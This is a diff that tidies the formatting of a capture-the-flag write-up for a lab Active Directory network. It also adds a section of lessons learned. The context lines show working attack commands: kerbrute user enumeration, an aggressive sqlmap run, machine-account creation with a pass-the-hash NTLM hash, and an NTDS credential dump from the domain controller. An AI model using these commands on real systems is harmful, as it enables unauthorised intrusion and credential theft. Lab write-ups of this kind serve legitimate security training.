@@ -20,9 +20,9 @@ description: Hard Windows Machine Writeup by Uzurly
 
 ---
 
- 🖥 Host 1 – 10.1.206.2 (DC01.hsm.local)
+### Host 1 – 10.1.206.2 (DC01.hsm.local)
 
- ✔ Host Information
+#### Host Information
 
 - **Detected hostname:** DC01.hsm.local
     
@@ -37,7 +37,7 @@ description: Hard Windows Machine Writeup by Uzurly
 
 ---
 
-📡 Open Ports & Services
+#### Open Ports & Services
 
 |Port|State|Service|Version / Information|
 |---|---|---|---|
@@ -56,7 +56,7 @@ description: Hard Windows Machine Writeup by Uzurly
 
 ---
 
-🔐 RDP Certificate
+#### RDP Certificate
 
 - **CN:** DC01.hsm.local
     
@@ -69,9 +69,9 @@ description: Hard Windows Machine Writeup by Uzurly
 
 ---
 
- 🖥 Host 2 – 10.1.182.10 (EC2AMAZ‑NS87CNK.hsm.local)
+### Host 2 – 10.1.182.10 (EC2AMAZ‑NS87CNK.hsm.local)
 
- ✔ Host Information
+#### Host Information
 
 - **Detected hostname:** EC2AMAZ‑NS87CNK.hsm.local
     
@@ -84,7 +84,7 @@ description: Hard Windows Machine Writeup by Uzurly
 
 ---
 
- 📡 Open Ports & Services
+#### Open Ports & Services
 
 |Port|State|Service|Version / Information|
 |---|---|---|---|
@@ -95,9 +95,9 @@ description: Hard Windows Machine Writeup by Uzurly
 
 ---
 
- 🖥 Host 3 – 10.1.66.62 (Linux – Ubuntu)
+### Host 3 – 10.1.66.62 (Linux – Ubuntu)
 
- ✔ Host Information
+#### Host Information
 
 - **OS:** Ubuntu Linux
     
@@ -106,7 +106,7 @@ description: Hard Windows Machine Writeup by Uzurly
 
 ---
 
-📡 Open Ports & Services
+#### Open Ports & Services
 
 |Port|State|Service|Version / Information|
 |---|---|---|---|
@@ -177,7 +177,7 @@ kerbrute userenum --domain "hsm.local"  --dc DC01.hsm.local /usr/share/wordlists
 ![6o](/assets/img/Writeup/Hacksmarter/Odyssey/6o.png)
 ![7o](/assets/img/Writeup/Hacksmarter/Odyssey/7o.png)
 
- Based on this error, I though it was possible to craft a valid SQL query to bypass the login. In this case, I launched SQLMap in the background as follows:
+ Based on this error, I thought it was possible to craft a valid SQL query to bypass the login. In this case, I launched SQLMap in the background as follows:
 ```
 sqlmap -u "http://10.1.66.62:5000/login" --batch --dbs --level 5 --risk 3
 ```
@@ -210,7 +210,8 @@ Priority: u=4
 
 ```
 ## SSTI Discover
-#### After taking a break and reconsidering the attack surface, I remembered the Enter your template input field. Initially, I tried supplying my own IP address to trigger a hit on Responder, but then I noticed that the input was being reflected in the response.
+
+After taking a break and reconsidering the attack surface, I remembered the "Enter your template" input field. Initially, I tried supplying my own IP address to trigger a hit on Responder, but then I noticed that the input was being reflected in the response.
 
 ![9o](/assets/img/Writeup/Hacksmarter/Odyssey/9o.png)
 
@@ -344,7 +345,7 @@ SMB         10.1.182.10     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\Administ
 SMB         10.1.182.10     445    EC2AMAZ-NS87CNK  [+] Executed command via wmiexec
 SMB         10.1.182.10     445    EC2AMAZ-NS87CNK  The command completed successfully.
 ```
- With the new Administrator password set, I could access the `C$` administrative share using `smbclientng` and retrieve the  flag.
+ With the new Administrator password set, I could access the `C$` administrative share using `smbclientng` and retrieve the flag.
 
 
 ![26](/assets/img/Writeup/Hacksmarter/Odyssey/26.png)
@@ -431,7 +432,7 @@ LDAP        10.1.206.2      389    DC01             [+] hsm.local\bbarkinson:53c
 MAQ         10.1.206.2      389    DC01             [*] Getting the MachineAccountQuota
 MAQ         10.1.206.2      389    DC01             MachineAccountQuota: 10
 ```
- We create the uzur account whit his Password.
+ We create the uzur account with its password.
 ```
 nxc smb  10.1.206.2 -u 'bbarkinson' -H '53c3709ae3d9f4428a230db81361ffbc'   -M add-computer -o NAME="uzur" PASSWORD='Password123!' --dns-server 10.1.206.2
 SMB         10.1.206.2      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:hsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -460,3 +461,11 @@ nxc smb dc01.hsm.local -u 'uzur$' -p 'Password123!' --ntds
 ```
 ![40](/assets/img/Writeup/Hacksmarter/Odyssey/40.png)
 ![42](/assets/img/Writeup/Hacksmarter/Odyssey/42.png)
+
+## Takeaways
+
+- Kerbrute coming up empty doesn't mean the recon is over — a web app that reflects user input is worth testing for SSTI even after an SQLi/XSS dead end.
+- A leaked private SSH key in a compromised user's home directory is often the fastest privilege-escalation path available; always check `.ssh/` during post-exploitation enumeration.
+- Credential reuse across hosts (the cracked Linux root password working for a Windows local account) is one of the highest-value things to test the moment you recover any plaintext password.
+- DNS misconfiguration on a domain-joined host can silently break tooling like SharpHound — if collection fails for no obvious reason, check that the DC actually resolves first.
+- A non-zero `MachineAccountQuota` turns any valid domain account into a way to mint a new computer account, which is often all that's needed to start BloodHound collection or abuse GPO permissions.
